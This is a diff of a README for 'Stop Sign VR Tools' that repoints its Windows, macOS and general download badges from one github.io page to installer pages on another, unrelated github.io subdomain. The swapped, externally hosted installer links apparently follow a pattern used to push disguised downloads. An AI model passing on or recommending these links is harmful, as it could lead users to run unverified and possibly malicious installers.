@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Stop Sign VR Tools provides the tools yo
 
 <div align="center">
 
-[![Download Stop Sign VR Tools](https://img.shields.io/badge/⬇_DOWNLOAD_Stop+Sign+VR+Tools-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Download Stop Sign VR Tools](https://img.shields.io/badge/⬇_DOWNLOAD_Stop+Sign+VR+Tools-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Stop Sign VR Tools provides the tools yo
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
